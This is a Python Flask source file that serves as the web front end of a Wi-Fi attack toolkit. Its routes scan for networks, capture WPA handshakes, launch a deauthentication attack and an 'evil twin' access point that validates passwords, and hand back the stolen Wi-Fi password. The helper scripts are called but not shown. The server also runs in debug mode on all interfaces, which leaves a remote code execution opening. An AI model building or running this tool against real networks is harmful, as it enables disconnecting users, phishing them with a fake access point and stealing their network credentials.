from flask import Flask, render_template, request, jsonify
import subprocess
import json
import os

app = Flask(__name__)

HANDSHAKE_FILE = "../scripts/handshake.txt"
PASSWORD_FILE = "../scripts/wifi_password.txt"

@app.route('/')
def index():
    """Render the web interface."""
    return render_template('index.html')

@app.route('/scan', methods=['GET'])
def scan_networks():
    """Scans for available Wi-Fi networks and returns JSON."""
    try:
        result = subprocess.run(["python3", "../scripts/scan.py"], capture_output=True, text=True)
        networks = json.loads(result.stdout.strip())
        return jsonify(networks)
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/capture', methods=['POST'])
def start_capture():
    """Starts handshake capture on selected SSID."""
    ssid = request.json.get("ssid")
    if not ssid:
        return jsonify({"error": "SSID is required"}), 400

    subprocess.Popen(["python3", "../scripts/capture.py", ssid])
    return jsonify({"status": f"Capturing handshake for {ssid}"})


@app.route('/start_attack', methods=['POST'])
def start_attack():
    """Starts Deauth Attack and Evil Twin with Validation."""
    ssid = request.json.get("ssid")
    bssid = request.json.get("bssid")
    gateway_mac = request.json.get("gateway_mac")

    if not ssid or not bssid or not gateway_mac:
        return jsonify({"error": "SSID, BSSID, and Gateway MAC are required"}), 400

    # Start deauth attack
    subprocess.Popen(["python3", "../scripts/deauth.py", bssid, gateway_mac])
    
    # Start Evil Twin & Password Validation
    subprocess.Popen(["python3", "../scripts/evil_twin_validate.py", ssid])

    return jsonify({"status": f"Deauth & Evil Twin Started for {ssid}"})


@app.route('/get_password', methods=['GET'])
def get_password():
    """Retrieves the obtained Wi-Fi password."""
    try:
        with open(PASSWORD_FILE, "r") as file:
            password = file.read().strip()
        return jsonify({"wifi_password": password})
    except FileNotFoundError:
        return jsonify({"wifi_password": "Not found yet."})


@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    """Stops Deauth & Evil Twin attacks."""
    os.system("sudo pkill hostapd")
    os.system("sudo pkill dnsmasq")
    os.system("sudo pkill aireplay-ng")
    return jsonify({"status": "All attacks stopped!"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
